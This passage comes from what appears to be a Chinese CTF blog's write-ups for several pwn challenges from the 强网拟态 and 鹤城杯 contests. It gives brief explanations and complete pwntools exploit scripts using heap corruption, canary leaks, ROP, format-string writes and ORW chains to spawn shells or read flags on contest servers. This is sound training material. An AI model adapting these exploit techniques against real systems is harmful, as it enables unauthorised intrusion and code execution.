range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\nadd(0x14,0xf8)\t#0x14\n\nadd(0x15,0x98)\t#0x15\nadd(0x16,0xe8)\t#0x16\nadd(0x17,0xe8)\t#0x17\nadd(0x18,0xf8)\t#0x18\nadd(0x19,0xf8)\t#0x19\nadd(0x1a,0xf8)\t#0x1a\n\nfor i in range(0x7):\n\tdelete(i)\nfor i in range(0x7,0x7+0x7):\n\tdelete(i)\n\ndelete(0x15)\n#off by null\nedit(0x18,'\\x22'*0xf0+p64(0x300+0xa0-0x10-0x10))\ndelete(0x19)\n\nfor i in range(0x7,0x7+0x7):\n\tadd(i,0x98)\n\n\nadd(0x1b,0x98)\nsleep(1)\nshow(0x1b)\nru(\"Content: \")\nlibc_base = u64Leakbase(0x3ec0b0)\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem = libc_base + libc.sym['system']\nlg(\"libc_base\",libc_base)\nlg(\"free_hook\",free_hook)\nlg(\"system\",system)\nsleep(1)\n\nadd(0x1c,0xe8)\nadd(0x1d,0xe8)\ndelete(0x1d)\ndelete(0x1c)\nedit(0x16,p64(free_hook))\nadd(0x1e,0xe8)\nadd(0x1f,0xe8)\nedit(0x1f,p64(system))\nedit(0x14,'/bin/sh\\x00'+\"\\x11\"*0x10)\ndelete(0x14)\nit()\n\n#flag{chz1IrUaAgSELXLciMeRB2XMeWQVZAKl}\n```\n\n# 五、pwnpwn\n\n泄露canary后直接ret2plt即可\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwnpwn\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"124.71.156.217\",\"49155\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"your choice>>\"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\nmain_addr = elf.sym['main']\nsystem_addr = elf.plt['system']\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\n\nsla(\"welcome to mimic world,try something\\n\",'1')\nru(\"let us give you some trick\\n0x\")\nelf_base = int(rc(12),16) - 0x9b9\nlg(\"elf_base\",elf_base)\nsl(\"2\")\nru(\"hello\\n\")\npayload = \"\"\npayload += \"M\"*(0x68)\nsl(payload)\nru(\"M\"*(0x68))\ncanary = u64(rc(8))-0xa\nlg(\"canary\",canary)\n\npayload1 = \"\"\npayload1 += \"D\"*(0x68)\npayload1 += p64(canary)\npayload1 += \"D\"*8\npayload1 += p64(elf_base + pop_rdi_ret)\npayload1 += p64(elf_base + 0x202010)\npayload1 += p64(elf_base + system_addr)\npayload1 += p64(elf_base + main_addr)\n\n\nsl(payload1)\np.interactive()\n\n#flag{63YGBWA1c0pfPrLqhQPiiGJCOl7JWMD9}\n```\n\n# 六、random_heap\n\n这道题目比较有意思，虽然是最简单的UAF，但是不知道为什么每次都会随机更换bin中chunk的位置，但是对应的索引chunk其实还是不变的，所以直接爆破就好。但是这个也可以通过填满0x100以下大小的tcache来更大概率getshell。\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./random_heap\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nlocal = 0\nif local:\n    p = process(context.binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(context.binary)\nelse:\n    p = remote(\"124.71.140.198\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"Your choice: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(idx,size):\n\tsla(menu,'1')\n\tsla('Index: ',str(idx))\n\tsla('Size: ',str(size))\ndef edit(idx,con):\n\tsla(menu,'2')\n\tsla('Index: ',str(idx))\n\tsla('Content: ',con)\ndef show(idx):\n\tsla(menu,'3')\n\tsla('Index: ',str(idx))\ndef delete(idx):\n\tsla(menu,'4')\n\tsla('Index: ',str(idx))\n\n\n#normal UAF\nadd(0,0x98)\nadd(1,0x28)\nfor i in range(8):\n\tedit(0,\"D\"*16)\n\tdelete(0)\n#leak libc\nshow(0)\nlibc_base = u64Leakbase(96+0x10+libc.sym['__malloc_hook'])\n\n__free_hook_addr = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlg(\"libc_base\",libc_base)\nlg(\"__free_hook_addr\",__free_hook_addr)\nlg(\"system_addr\",system_addr)\nadd(2,0x28)\ndelete(2)\nedit(2,p64(__free_hook_addr)+p64(0))\nedit(1,'/bin/sh\\x00')\n\ndbg()\n#prented random\nwhile True:\n\ttry:\n\t\tadd(3,0x48)\n\t\tadd(4,0x48)\n\t\tedit(4,p64(system_addr))\n\t\tedit(3,'/bin/sh\\x00')\n\t\tdelete(3)\n\t\tdelete(4)\n\texcept:\n\t\tit()\n\n#flag{bdcef975ec2589f3e58d105d06587798}\n```\n\n# 七、bornote\n\n这道题目贼傻逼，最开始依据urandom申请了一个随机大小chunk，导致堆布局会失效。但是由于题目设置，实际上也就存在大概十来种大小的chunk，选一个实例爆破一下即可。但是最开始我居然还以为这个是很随机的，直接假设申请了240大小的Chunk，结果爆了一晚上都没爆出来，实在是傻逼了。之后就是正常的2.31下的off by null了。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./note\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"cmd: \"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n    myGdb.interactive()\n    myGdb.sendline('b *$rebase(0xdbd)')\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(size):\n\tsla(menu, \"1\")\n\tsla(\"Size: \", str(size))\n\ndef delete(idx):\n\tsla(menu, \"2\")\n\tsla(\"Index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"4\")\n\tsla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n\tsla(menu, \"3\")\n\tsla(\"Index: \", str(idx))\n\tsla(\"Note: \", con)\n\ndef pwn():\n\tsla(\"username: \",\"DBDX\")\n\tadd(0x478)\n\tadd(0x478)\n\tadd(0x478)\n\tdelete(0)\n\tdelete(1)\n\tdelete(2)\n\n\t#0x9f0\n\tadd(0x118)\n\tedit(0,'\\x11'*0x10)\n\tadd(0x418) #1 fd 0x---2b0\n\tadd(0x108) #2\n\tadd(0x418) #3\n\tadd(0x438) #4 unlink_chunk 0x---c00\n\tadd(0x108) #5\n\tadd(0x428) #6 bk 0x---150\n\tadd(0x208) #7\n\t#left fd bk in 0x---c00\n\tdelete(1)\n\tdelete(4)\n\tdelete(6)\n\t#merge and carve to get 0x---c20 and change size which in 0x---c00 \n\tdelete(3)\n\t\n\tadd(0x438) #8 set size  \t\t\t\n\tedit(1,'\\x08'*0x418 + '\\x91'+'\\x0b')\n\t\n\t#reply\t\n\tadd(0x418) # 9 0x---c20 \t\t\t\t\t\t\n\tadd(0x428) # 10 bk 0x---150 \t\t\t\t\t\n\tadd(0x418) # 11 fd 0x---2b0 \t\t\t\t\t\n\t\n\t#repair fd\n\tdelete(6) #0x---2b0  \t\t11\n\tdelete(3) #0x---c20 \t\t9\n\tadd(0x418) # 12 0x---2b0 to overflow \\x00 in fd  \t\n\tedit(3,'DBDXZNBA')\n\tadd(0x418) # 13 0x---c20 \t\t\t\t\t\t\t\n\n\n\t#repair bk\n\tdelete(6) \t\t#13\n\tdelete(4) \t\t#4\n\t\n\tadd(0x5f8) #14 let 0x---150 0x---c20 into largebin  \t\n\t\n\tadd(0x428) # 15 0x---150 to overflow \\x00 in fd  \t\t\t\t\n\tedit(6,'')\n\t\n\t#trigger off-by-null\n\tedit(7,'\\x77'*0x200+p64(0xb90))\n\tadd(0x18)\t\t\t\n\tdelete(4)\n\tadd(0x18)\t\t\t\n\tadd(0x3d8)\n\tshow(4)\n\tru(\"Note: \")\n\tlibc_base = u64Leakbase(96+0x10+libc.sym['__malloc_hook'])\n\tfree_hook = libc_base + libc.sym['__free_hook']\n\tsystem_addr = libc_base + libc.sym['system']\n\tone = libc_base + 0xe6c81\n\tlg(\"libc_base\",libc_base)\n\tlg(\"free_hook\",free_hook)\n\tlg(\"system_addr\",system_addr)\n\tdelete(0)\n\tdelete(2)\n\tadd(0x48)\n\tadd(0x18)\n\t\n\tdelete(1)\n\tdelete(3)\n\tdelete(2)\n\tdelete(8)\n\t\n\tedit(0,'/bin/sh\\x00'+p64(0x0)\n\t\t+p64(0x440)+p64(0x20)\n\t\t+p64(free_hook))\n\t\n\tadd(0x18)\n\tadd(0x18)\n\t\n\tedit(2,p64(one))\n\tdelete(0)\n\tit()\n\n\n    i = 0\n    while True:\n        i += 1\n        log.info(\"Times:%d\"%i)\n        try:\n            p = remote(\"121.36.250.162\",49153)\n            #p = process(\"./bornote\")\n            pwn()\n        except EOFError:\n            p.close()\n            continue\n        else:\n            p.interactive()\n            break\n\n\n\n#flag{d483f651c1cbcad9a7bb87d04d498ea7}\n```\n\n# 八、oldecho\n\n这道题目最有意思了，close(1)，然后循环的格式化字符串。需要改stdout的fileno为2才能恢复输出。同时由于close(1)，导致格式化输出printf的大小不能太大，大概0x2000左右就不行了，所以也需要爆破一下。之后又由于栈环境问题，这里给了栈地址，但也是需要爆破一下最后的一些大小问题，大概设置在一定范围可控。\n\n此外由于栈上没有stdout，所以需要抬栈，比赛的时候没做过改fileno的，是学长做的。赛后照着自己的思路复现了一下，先覆盖返回地址返回到上一层函数，即main函数中，之后再返回到start，之后就使得可以在栈上留下IO_2_1_stout。(这里具体为什么会出现我也不太懂)\n\n然后就是改返回地址，pop rbp将输入的bss段给rbp，然后借助leave ret指令将rbp给到rsp，劫持栈到输入的bss段上，之后就是正常的ORW。\n\n这里借助栈寻找gadget也是一个小难点。\n\n```\nfrom pwn import *\nimport sys\n\nbinary = \"./oldecho\"\ncontext.log_level = \"debug\"\n#context.binary = binary\ncontext.arch = \"amd64\"\nelf = ELF(binary)\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\n\nglobal p\n\n\n\ndef dbg():\n    gdb.attach(p)\n    pause()\n\ndef dockerDbg():\n    myGdb = remote(\"127.0.0.1\",30001)\n    myGdb.close()\n    pause()\n#b *$rebase(0xdbd)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\ndef pwn():\n    #p = remote(\"123.60.32.152\",49153)\n    p.recvuntil('Gift: ')\n    stack = int(p.recv(14),16)\n    log.info('Stack:\\t' + hex(stack))\n    offset = 9\n    retval = stack&0xFFFF\n    if retval > 0x2000:\n        raise Exception(\"Invalid stack!\")\n\n    retval1 = stack&0xFF\n    if retval1 <= 0x50:\n        raise Exception(\"Invalid stack!\")\n    \n    retval2 = stack&0xFF\n    if retval1 >= 0xe8:\n        raise Exception(\"Invalid stack!\")\n    \n    #return to 0xe40 main to get io_2_1_stdout\n    p.recv()\n    p.sendline('%' + str(((stack&0xFF) - 0x10)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x40) + 'c%10$hhn')\n    \n    #return to start\n    p.sendline('%' + str(((stack&0xFF) - 0x38)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x3f) + 'c%10$hhn')\n \n\n    #change list to io\n    p.sendline('%' + str(((stack&0xFF) - 0x80)) + 'c%15$hhn')\n    #pause()\n    \n    #change IO fileno\n    p.sendline('%' + str(0x90) + 'c%41$hhn')\n    p.sendline('%'+ str(0x2) + 'c%29$hhnGet')\n    # p.recvuntil('xxxx',timeout=0.5)\n    # #dockerDbg()\n    test = 'AAAA'\n    leakPl =  \"ELF:%7$p.Libc:%13$p\"\n    \n    # p.sendline(test)\n    ru(\"Get\")\n    #dockerDbg()\n    p.sendline(leakPl)\n    #pause()\n    #p.interactive()\n    ru(\"ELF:0x\")\n    elf_base = int(rc(12),16) -0xe1e\n    ru(\"Libc:0x\")\n    libc_base = int(rc(12),16) - 240 -libc.sym['__libc_start_main']\n    if libc_base&0xFFFF > 0x2000:\n        raise Exception(\"Invalid Libc!\")\n    # print(elf_base)\n    # print(libc_base)\n    lg(\"elf_base\",elf_base)\n    lg(\"libc_base\",libc_base)\n    #pause()\n    \n    pop_rbp_r13_r14_ret =libc_base + 0x00000000000206d1\n    pop_rsi_ret = libc_base + 0x00000000000202f8\n    pop_rdi_ret = libc_base + 0x0000000000021112\n    pop_rdx_ret = libc_base + 0x0000000000001b92\n    pop_rdx_rsi = libc_base + 0x00000000001151c9\n    pop_rax_ret = libc_base + 0x000000000003a738\n    xchg_eax_esp_ret = libc_base + 0x0aa985\n    Open = libc_base + libc.sym['open']\n    Read = libc_base + libc.sym['read']\n    Puts = libc_base + libc.sym['puts']\n    orw  = './flag\\x00\\x00'\n    orw += p64(pop_rdi_ret) + p64(elf_base + 0x202060)\n    orw += p64(pop_rsi_ret) + p64(0) \n    orw += p64(Open)\n    orw += p64(pop_rdi_ret) + p64(1)\n    orw += p64(pop_rsi_ret) + p64(elf_base + 0x2020F0)\n    orw += p64(pop_rdx_ret) + p64(0x30)\n    orw += p64(Read)\n    orw += p64(pop_rdi_ret) + p64(elf_base + 0x2020F0)\n    orw += p64(Puts)\n\n\n\n    #dockerDbg()\n    p.sendline('%' + str(((stack&0xFF)+0x8)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x60) + 'c%10$hhn')\n    #pause()\n\n\n    #dockerDbg()\n    p.sendline('%' + str(((stack&0xFF)+ 0x20)) + 'c%6$hhn')\n    p.sendline('%'+ str(0x3e) + 'c%10$hhn')\n    #pause()\n    \n    #dockerDbg()\n    p.sendline('%' + str(((stack&0xFF))) + 'c%6$hhn')\n    p.sendline('%'+ str(pop_rbp_r13_r14_ret&0xFFFF) + 'c%10$hn')\n    #pause()\n\n\n    #dockerDbg()\n    payload = \"\"\n    payload += \"Bye~\"\n    payload = payload.ljust(0x20,'\\x00')\n    payload += orw\n    p.sendline(payload)\n    it()\n\n\ni = 0\nwhile True:\n    i += 1\n    log.info(\"Times:%d\"%i)\n    try:\n        p = process(binary)\n        pwn()\n    except EOFError:\n        p.close()\n        continue\n    except Exception:\n        p.close()\n        continue\n    else:\n        p.interactive()\n        break\nit()\n\n\n# flag{NpfH6fzHStuKl2CRfvheXWyKO3Bz60F5}\n```\n\n总的来说这次pwn着实有点水，和强网杯一比差好远啊。\n","tags":["强网拟态WP"],"categories":["强网拟态WP"]},{"title":"鹤城杯WP","url":"/2021/10/24/鹤城杯WP/","content":"\n# 前言\n\n这次比赛就坑爹\n\n# 一、babyof\n\n栈溢出白给，泄露地址后直接打即可\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./babyof\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"182.116.62.85\",\"29394\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = 0x40066B\n\npop_rdi_ret = 0x400743\nret = 0x400744\n\npayload = \"\"\npayload += \"A\"*(64+8)\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(main_addr)\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsl(payload)\nru(\"I hope you win\\n\")\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n\n#libcsearcher use\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\none_gadget = libc_base + 0x10a41c\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\npayload = \"\"\npayload += \"A\"*(64+8)\npayload += p64(one_gadget)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsl(payload)\np.interactive()\n\n#flag{3c011eeb10d8b8256d4eeb1a700262d3}\n```\n\n# 二、littleof\n\n栈溢出加canary，也是白给，就是不知道放个stdin file在栈上是啥意思\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./littleof\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"182.116.62.85\",\"27056\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\ndef dbg():\n    gdb.attach(p)\n    pause()\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = 0x400789\n\npop_rdi_ret = 0x400863\nret = 0x400864\n\npayload1 = \"\"\npayload1 += \"A\"*(0x50-0x8)\npayload1 += \"\\x01\"\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsd(payload1)\nru(\"A\"*(0x50-0x8))\ncanary = u64(rc(8).ljust(8,'\\x00'))-0x1\nlog.info(\"canary:0x%x\"%canary)\n\npayload2 = \"\"\npayload2 += \"A\"*(0x50-0x8)\npayload2 += p64(canary)\npayload2 += \"A\"*(0x8)\npayload2 += p64(pop_rdi_ret)\npayload2 += p64(puts_got)\npayload2 += p64(puts_plt)\npayload2 += p64(main_addr)\n#dbg()\nsd(payload2)\n#pause()\nru(\"I hope you win\\n\")\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\none_gadget = libc_base + 0x10a41c\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\n\npayload = \"\"\npayload += \"A\"*(0x50-0x8)\npayload += p64(canary)\npayload += \"A\"*(0x8)\npayload += p64(one_gadget)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"Do you know how to do buffer overflow?\\n\")\nsl(\"A\"*8)\nru(\"Try harder!\")\nsd(payload)\np.interactive()\n\n#flag{3c011eeb10d8b8256d4eeb1a700262d3}\n```\n\n\n\n# 三、easyecho\n\n利用canary的机制，检测到canary被篡改时，会打印程序的名字，而程序的名字在最开始就被放到栈上，可以通过溢出修改到该地址。然后backdoor之后，把原本指向程序名字的字符串指针，改为指向flag的指针即可。\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./easyecho\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"182.116.62.85\",\"24842\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\ndef dbg():\n    gdb.attach(p)\n    pause()\n\nru(\"Name: \")\nsl(\"a\"*0x10)\nru(\"a\"*0x10)\nelfbase=u64(rc(6).ljust(8,'\\x00'))-0xcf0\nlg('elfbase',elfbase)\n\nru(\"Input: \")\nsl(\"backdoor\")\nru(\"Input: \")\nsl(0x2D*'PIG007NB'+p64(elfbase+0x202040))\nru(\"Input: \")\nsl(\"exitexit\")\n\np.interactive()\n\n#flag{11dc27eed9e5277915c1dfd28992812b}\n```\n\n# 四、onecho\n\n32位栈溢出加ORW，要么泄露栈地址，然后open打开栈上的flag指针，或者再读取，将flag字符串读取到一个可读可写的地方，这里可以选择malloc_hook或者free_hook。此外通过environ泄露栈地址，从栈上获取flag字符串指针也是可以的。\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./onecho\"\ncontext.binary = binary\nlibc=ELF('/lib/i386-linux-gnu/libc-2.27.so')\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\nelse:\n    p = remote(\"182.116.62.85\",\"24143\")\n    elf = ELF(binary)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"your choice>>\"\n\ndef 